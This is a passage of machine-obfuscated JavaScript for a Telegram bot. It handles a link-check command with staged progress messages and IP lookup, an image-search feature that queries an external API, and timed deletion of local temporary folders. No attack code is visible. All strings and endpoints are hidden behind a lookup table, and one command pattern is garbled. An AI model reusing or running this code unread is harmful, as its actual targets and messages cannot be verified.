    bot[_0xd7c95f(0x5ad) + 'e'](_0x4827fd, _0x1d6011[_0xd7c95f(0x44a)], _0x13c912);
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), _0x77303 => {
    const _0x202338 = _0x317544, _0x1827d7 = {
            'IzceC': function (_0x23228f, _0x4151be) {
                return _0x23228f === _0x4151be;
            },
            'CqSwq': _0x202338(0x6de) + 's',
            'BggeF': _0x202338(0x778) + _0x202338(0x728) + _0x202338(0x52e)
        }, _0x802cc7 = _0x77303[_0x202338(0x4b7)][_0x202338(0x61f)]['id'];
    _0x1827d7[_0x202338(0x2da)](_0x77303[_0x202338(0x369)], _0x1827d7[_0x202338(0x306)]) && (bot[_0x202338(0x5ad) + 'e'](_0x802cc7, _0x1827d7[_0x202338(0x8e0)]), waiting_for_link[_0x802cc7] = !![]);
}), bot['on'](_0x317544(0x4b7), async _0x2c3f02 => {
    const _0x5072ec = _0x317544, _0x2a0657 = {
            'AHTnQ': function (_0xb73345, _0xb9c4c9) {
                return _0xb73345(_0xb9c4c9);
            },
            'lLvfu': _0x5072ec(0x911) + _0x5072ec(0x824) + _0x5072ec(0x653),
            'sHFuT': _0x5072ec(0x554) + _0x5072ec(0x272) + _0x5072ec(0x6b9) + '%',
            'BlaXH': _0x5072ec(0x554) + _0x5072ec(0x1f9) + _0x5072ec(0x6cf) + '5%',
            'HVKYE': _0x5072ec(0x554) + _0x5072ec(0x66b) + _0x5072ec(0x6f9) + '0%',
            'BCsHL': function (_0x411df5, _0x3d93d4) {
                return _0x411df5(_0x3d93d4);
            },
            'ecOxp': _0x5072ec(0x554) + _0x5072ec(0x66b) + _0x5072ec(0x2e4) + '5%',
            'TOUUZ': _0x5072ec(0x554) + _0x5072ec(0x66b) + _0x5072ec(0x4dd) + _0x5072ec(0x5ef),
            'NPBLC': function (_0x3975b3, _0x21289e) {
                return _0x3975b3(_0x21289e);
            },
            'fJzUK': function (_0x10f0bd, _0x4139d1) {
                return _0x10f0bd(_0x4139d1);
            },
            'zqvUh': function (_0x3e2368, _0x18a8f0) {
                return _0x3e2368 === _0x18a8f0;
            },
            'RNSEq': _0x5072ec(0x2c8),
            'rPdqd': _0x5072ec(0x4ac) + _0x5072ec(0x4b0) + _0x5072ec(0x89b) + _0x5072ec(0x670),
            'hhkYQ': _0x5072ec(0x70c),
            'ndZPm': _0x5072ec(0x1e8) + _0x5072ec(0x49a) + _0x5072ec(0x74a) + _0x5072ec(0x48b) + _0x5072ec(0x3ff) + _0x5072ec(0x2e1) + _0x5072ec(0x16d) + _0x5072ec(0x4d8) + _0x5072ec(0x1e2) + _0x5072ec(0x407) + _0x5072ec(0x772) + _0x5072ec(0x7a1) + _0x5072ec(0x611) + _0x5072ec(0x59b) + _0x5072ec(0x4db) + _0x5072ec(0x29a) + _0x5072ec(0x402) + _0x5072ec(0x648) + _0x5072ec(0x4a6) + _0x5072ec(0x77f) + _0x5072ec(0x253),
            'agqHy': _0x5072ec(0x5c9) + '🔴',
            'EikNe': _0x5072ec(0x864) + _0x5072ec(0x357) + _0x5072ec(0x295) + _0x5072ec(0x472) + _0x5072ec(0x60a) + _0x5072ec(0x637) + _0x5072ec(0x776) + _0x5072ec(0x815) + _0x5072ec(0x36f) + _0x5072ec(0x1f7) + _0x5072ec(0x5ac) + _0x5072ec(0x538) + _0x5072ec(0x286) + _0x5072ec(0x515) + _0x5072ec(0x5a2) + _0x5072ec(0x508) + _0x5072ec(0x6a5),
            'BCGOv': function (_0x1f878c, _0x2dfdf5) {
                return _0x1f878c || _0x2dfdf5;
            },
            'AZDPT': _0x5072ec(0x784) + _0x5072ec(0x8e5),
            'rGpuM': _0x5072ec(0x6b3)
        }, _0x44e525 = _0x2c3f02[_0x5072ec(0x61f)]['id'], _0x581c6f = _0x2c3f02[_0x5072ec(0x4b4)];
    if (waiting_for_link[_0x44e525]) {
        if (!_0x2a0657[_0x5072ec(0x77d)](isValidUrl, _0x581c6f)) {
            bot[_0x5072ec(0x5ad) + 'e'](_0x44e525, _0x2a0657[_0x5072ec(0x456)]);
            return;
        }
        let _0x2ce2a3 = await bot[_0x5072ec(0x5ad) + 'e'](_0x44e525, _0x2a0657[_0x5072ec(0x1ee)]);
        await _0x2a0657[_0x5072ec(0x77d)](sleep, -0xcf8 + 0x1 * 0x1459 + -0x83f * -0x1), bot[_0x5072ec(0x8b1) + _0x5072ec(0x798)](_0x2a0657[_0x5072ec(0x2e0)], {
            'chat_id': _0x44e525,
            'message_id': _0x2ce2a3[_0x5072ec(0x204)]
        }), await _0x2a0657[_0x5072ec(0x77d)](sleep, 0x4 * 0x395 + 0x21a + -0x1 * 0xce), bot[_0x5072ec(0x8b1) + _0x5072ec(0x798)](_0x2a0657[_0x5072ec(0x744)], {
            'chat_id': _0x44e525,
            'message_id': _0x2ce2a3[_0x5072ec(0x204)]
        }), await _0x2a0657[_0x5072ec(0x44d)](sleep, -0x25e9 + -0x5ca + -0x3b53 * -0x1), bot[_0x5072ec(0x8b1) + _0x5072ec(0x798)](_0x2a0657[_0x5072ec(0x487)], {
            'chat_id': _0x44e525,
            'message_id': _0x2ce2a3[_0x5072ec(0x204)]
        }), await _0x2a0657[_0x5072ec(0x77d)](sleep, 0x7f * -0x1d + 0xe3f * 0x2 + -0x1 * -0x185), bot[_0x5072ec(0x8b1) + _0x5072ec(0x798)](_0x2a0657[_0x5072ec(0x27a)], {
            'chat_id': _0x44e525,
            'message_id': _0x2ce2a3[_0x5072ec(0x204)]
        }), await _0x2a0657[_0x5072ec(0x44d)](sleep, 0x1ae2 + 0x59 * -0x6b + 0xe39), bot[_0x5072ec(0x7e2) + _0x5072ec(0x22e)](_0x44e525, _0x2ce2a3[_0x5072ec(0x204)]);
        const _0x525f5c = _0x2a0657[_0x5072ec(0x874)](checkUrl, _0x581c6f), _0x8e4bd5 = await _0x2a0657[_0x5072ec(0x44d)](extractIpFromUrl, _0x581c6f), _0x3c3aa5 = _0x8e4bd5 ? await _0x2a0657[_0x5072ec(0x4d3)](getIpInfo, _0x8e4bd5) : {};
        let _0x73fc98 = '';
        if (_0x2a0657[_0x5072ec(0x26d)](_0x525f5c, _0x2a0657[_0x5072ec(0x536)]))
            _0x73fc98 = _0x2a0657[_0x5072ec(0x831)];
        else {
            if (_0x2a0657[_0x5072ec(0x26d)](_0x525f5c, _0x2a0657[_0x5072ec(0x358)]))
                _0x73fc98 = _0x2a0657[_0x5072ec(0x443)];
            else
                _0x2a0657[_0x5072ec(0x26d)](_0x525f5c, _0x2a0657[_0x5072ec(0x4c5)]) && (_0x73fc98 = _0x2a0657[_0x5072ec(0x17e)]);
        }
        const _0x400bb1 = _0x5072ec(0x84b) + _0x5072ec(0x7b1) + _0x581c6f + (_0x5072ec(0x38d) + _0x5072ec(0x6f5) + ':\x20') + _0x525f5c + (_0x5072ec(0x38d) + _0x5072ec(0x482) + _0x5072ec(0x875)) + _0x73fc98 + (_0x5072ec(0x38d) + _0x5072ec(0x462) + _0x5072ec(0x8a3)) + _0x2a0657[_0x5072ec(0x5a4)](_0x8e4bd5, _0x2a0657[_0x5072ec(0x222)]) + (_0x5072ec(0x38d) + _0x5072ec(0x76a) + _0x5072ec(0x372)) + (_0x3c3aa5[_0x5072ec(0x867)] || _0x2a0657[_0x5072ec(0x807)]) + _0x5072ec(0x2e9);
        bot[_0x5072ec(0x5ad) + 'e'](_0x44e525, _0x400bb1), waiting_for_link[_0x44e525] = ![];
    } else
        bot[_0x5072ec(0x5ad) + 'e'](_0x44e525, '');
});
const currentSearch = {};
bot[_0x317544(0x62c)](/\/stاههلىنححظةرلrt/, _0xfee4dd => {
    const _0x5ab7df = _0x317544, _0x19dc8c = {
            'ukpbg': _0x5ab7df(0x617),
            'zeJxO': _0x5ab7df(0x4a4) + _0x5ab7df(0x655),
            'LPxiy': _0x5ab7df(0x5a9) + _0x5ab7df(0x3e1) + _0x5ab7df(0x2db) + _0x5ab7df(0x34a) + _0x5ab7df(0x82a) + _0x5ab7df(0x6f3) + '-'
        }, _0x214474 = _0xfee4dd[_0x5ab7df(0x61f)]['id'], _0x4a8543 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x19dc8c[_0x5ab7df(0x6b6)],
                            'callback_data': _0x19dc8c[_0x5ab7df(0x470)]
                        }]]
            }
        };
    bot[_0x5ab7df(0x5ad) + 'e'](_0x214474, _0x19dc8c[_0x5ab7df(0x28e)], _0x4a8543);
}), bot['on'](_0x317544(0x635) + _0x317544(0x53f), async _0x50e255 => {
    const _0x1eda43 = _0x317544, _0x55dd60 = {
            'cTnGS': function (_0x126c6b, _0x1f1fe9) {
                return _0x126c6b === _0x1f1fe9;
            },
            'InFqO': _0x1eda43(0x4a4) + _0x1eda43(0x655),
            'AOBtb': function (_0x166e2a, _0x3b573a) {
                return _0x166e2a === _0x3b573a;
            },
            'AxaEG': _0x1eda43(0x3e6) + _0x1eda43(0x6c0),
            'UCrjK': _0x1eda43(0x80f) + _0x1eda43(0x791) + _0x1eda43(0x56d) + _0x1eda43(0x1b9) + _0x1eda43(0x917),
            'qDyUY': _0x1eda43(0x460) + _0x1eda43(0x469) + _0x1eda43(0x3a4) + _0x1eda43(0x4fc) + _0x1eda43(0x3c0) + _0x1eda43(0x3ea) + _0x1eda43(0x901) + _0x1eda43(0x474) + _0x1eda43(0x83c) + _0x1eda43(0x677) + _0x1eda43(0x3ce) + _0x1eda43(0x91f) + _0x1eda43(0x74c) + _0x1eda43(0x232) + _0x1eda43(0x7cf) + _0x1eda43(0x4f3) + _0x1eda43(0x44e) + '\x20'
        }, _0x1ef9d7 = _0x50e255[_0x1eda43(0x4b7)][_0x1eda43(0x61f)]['id'];
    _0x55dd60[_0x1eda43(0x5c3)](_0x50e255[_0x1eda43(0x369)], _0x55dd60[_0x1eda43(0x60d)]) && (_0x55dd60[_0x1eda43(0x871)](currentSearch[_0x1ef9d7], _0x55dd60[_0x1eda43(0x2b3)]) ? bot[_0x1eda43(0x5ad) + 'e'](_0x1ef9d7, _0x55dd60[_0x1eda43(0x729)]) : (bot[_0x1eda43(0x5ad) + 'e'](_0x1ef9d7, _0x55dd60[_0x1eda43(0x8e3)]), currentSearch[_0x1ef9d7] = _0x55dd60[_0x1eda43(0x2b3)]));
}), bot['on'](_0x317544(0x4b7), async _0x1cd442 => {
    const _0x13cc17 = _0x317544, _0x1350d3 = {
            'LcSGF': function (_0x6d1e69, _0x524037) {
                return _0x6d1e69 === _0x524037;
            },
            'WNqtW': _0x13cc17(0x3e6) + _0x13cc17(0x6c0),
            'mITLp': function (_0x14c779, _0x3eb902) {
                return _0x14c779(_0x3eb902);
            },
            'mfQWd': function (_0x2def6b, _0x4150cb) {
                return _0x2def6b(_0x4150cb);
            },
            'ZwVSF': function (_0x359294, _0x273d04) {
                return _0x359294 === _0x273d04;
            },
            'OGUQq': _0x13cc17(0x187) + _0x13cc17(0x6a7) + _0x13cc17(0x8b0),
            'cvNZo': function (_0x13e1b0, _0x214f64) {
                return _0x13e1b0 < _0x214f64;
            },
            'VVIsg': function (_0x45964f, _0x265690) {
                return _0x45964f + _0x265690;
            },
            'mFwtr': _0x13cc17(0x3bd) + _0x13cc17(0x5ca) + _0x13cc17(0x75f) + _0x13cc17(0x799),
            'BKRlM': function (_0xbf19ac, _0x29a5b7) {
                return _0xbf19ac !== _0x29a5b7;
            }
        }, _0x3e8586 = _0x1cd442[_0x13cc17(0x61f)]['id'];
    if (_0x1350d3[_0x13cc17(0x2f9)](currentSearch[_0x3e8586], _0x1350d3[_0x13cc17(0x3ae)])) {
        const _0x833e32 = _0x1cd442[_0x13cc17(0x4b4)], _0xf53438 = _0x13cc17(0x4d9) + _0x13cc17(0x24b) + _0x13cc17(0x519) + _0x13cc17(0x434) + _0x13cc17(0x8c7) + _0x13cc17(0x8a6) + _0x13cc17(0x16f) + _0x13cc17(0x860) + _0x13cc17(0x673) + _0x1350d3[_0x13cc17(0x229)](encodeURIComponent, _0x833e32) + (_0x13cc17(0x2d3) + _0x13cc17(0x23c) + _0x13cc17(0x6a3)) + _0x1350d3[_0x13cc17(0x74e)](encodeURIComponent, _0x833e32) + (_0x13cc17(0x8a9) + _0x13cc17(0x34e) + _0x13cc17(0x886) + _0x13cc17(0x8de) + _0x13cc17(0x1d0));
        try {
            const _0x851a41 = await axios[_0x13cc17(0x3c5)](_0xf53438), _0x4009da = _0x851a41[_0x13cc17(0x369)][_0x13cc17(0x1f6) + _0x13cc17(0x351)]?.[_0x13cc17(0x369)]?.[_0x13cc17(0x796)] || [];
            if (_0x1350d3[_0x13cc17(0x37f)](_0x4009da[_0x13cc17(0x2c6)], -0x188a + -0x1 * 0x17e9 + 0x3073)) {
                bot[_0x13cc17(0x5ad) + 'e'](_0x3e8586, _0x1350d3[_0x13cc17(0x1c5)]), delete currentSearch[_0x3e8586];
                return;
            }
            for (let _0x4911cf = 0x154b + 0x254b + 0x1d4b * -0x2; _0x1350d3[_0x13cc17(0x3fa)](_0x4911cf, _0x4009da[_0x13cc17(0x2c6)]); _0x4911cf++) {
                const _0x38e685 = _0x4009da[_0x4911cf], _0x115b88 = _0x38e685[_0x13cc17(0x73a)]?.[_0x13cc17(0x57b)]?.[_0x13cc17(0x86f)];
                _0x115b88 ? bot[_0x13cc17(0x685)](_0x3e8586, _0x115b88, { 'caption': _0x13cc17(0x67b) + _0x1350d3[_0x13cc17(0x3d0)](_0x4911cf, -0x23b * 0x9 + -0x1523 + -0x1 * -0x2937) }) : bot[_0x13cc17(0x5ad) + 'e'](_0x3e8586, _0x1350d3[_0x13cc17(0x77a)]);
            }
            delete currentSearch[_0x3e8586];
        } catch (_0x19bab2) {
            bot[_0x13cc17(0x5ad) + 'e'](_0x3e8586, _0x13cc17(0x794) + _0x19bab2[_0x13cc17(0x4b7)]), delete currentSearch[_0x3e8586];
        }
    } else {
        if (!currentSearch[_0x3e8586])
            bot[_0x13cc17(0x5ad) + 'e'](_0x3e8586, '');
        else
            _0x1350d3[_0x13cc17(0x700)](currentSearch[_0x3e8586], _0x1350d3[_0x13cc17(0x3ae)]) && bot[_0x13cc17(0x5ad) + 'e'](_0x3e8586, '');
    }
});
const clearTemporaryStorage = () => {
    const _0x3f0610 = _0x317544, _0x41d33e = {
            'fPZCn': function (_0x5411f8, _0x172a4d) {
                return _0x5411f8(_0x172a4d);
            },
            'DrpZE': _0x3f0610(0x4fb) + _0x3f0610(0x32d) + _0x3f0610(0x3b4),
            'NwuVy': _0x3f0610(0x7e5),
            'LydSE': _0x3f0610(0x5d5),
            'kNSHe': _0x3f0610(0x73a),
            'ijcbl': _0x3f0610(0x771) + _0x3f0610(0x3e2) + _0x3f0610(0x892) + _0x3f0610(0x60b)
        };
    try {
        console[_0x3f0610(0x699)](_0x41d33e[_0x3f0610(0x836)]);
        const _0x4f67dd = [
            _0x41d33e[_0x3f0610(0x404)],
            _0x41d33e[_0x3f0610(0x516)],
            _0x41d33e[_0x3f0610(0x212)]
        ];
        _0x4f67dd[_0x3f0610(0x3b5)](_0x251353 => {
            const _0x3baa6f = _0x3f0610, _0x465125 = path[_0x3baa6f(0x57f)](__dirname, _0x251353);
            fs[_0x3baa6f(0x899)](_0x465125) ? (_0x41d33e[_0x3baa6f(0x4f6)](deleteFolderRecursive, _0x465125), console[_0x3baa6f(0x699)](_0x3baa6f(0x193) + _0x3baa6f(0x6eb) + _0x465125)) : console[_0x3baa6f(0x699)](_0x3baa6f(0x816) + _0x3baa6f(0x600) + _0x465125);
        });
    } catch (_0x233fb3) {
        console[_0x3f0610(0x5bb)](_0x41d33e[_0x3f0610(0x2df)], _0x233fb3);
    }
};
setInterval(() => {
    const _0x280e4a = _0x317544, _0x5dd55a = {
            'rjvQx': function (_0x4bb716) {
                return _0x4bb716();
            },
            'dpZiv': _0x280e4a(0x294) + _0x280e4a(0x818) + _0x280e4a(0x77b)
        };
    _0x5dd55a[_0x280e4a(0x5c8)](clearTemporaryStorage), console[_0x280e4a(0x699)](_0x5dd55a[_0x280e4a(0x2be)]);
}, (0x8b5 * -0x2 + 0x11a3 + -0x37) * (0x12df + 0x4f3 + -0x1796) * (-0x24c4 + -0x9a * -0x13 + 0x26 * 0xc5));
const handleExit = () => {
    const _0x15b7a2 = _0x317544, _0x1e34d3 = {
            'nfxam': _0x15b7a2(0x625) + _0x15b7a2(0x48f) + _0x15b7a2(0x446) + _0x15b7a2(0x178),
            'AoUqR': function (_0x2efa10) {
                return _0x2efa10();
            }
        };
    console[_0x15b7a2(0x699)](_0x1e34d3[_0x15b7a2(0x665)]), _0x1e34d3[_0x15b7a2(0x45c)](clearTemporaryStorage), process[_0x15b7a2(0x897)]();
};
process['on'](_0x317544(0x897), handleExit), process['on'](_0x317544(0x66a), handleExit), process['on'](_0x317544(0x1c2), handleExit), process['on'](_0x317544(0x591), handleExit);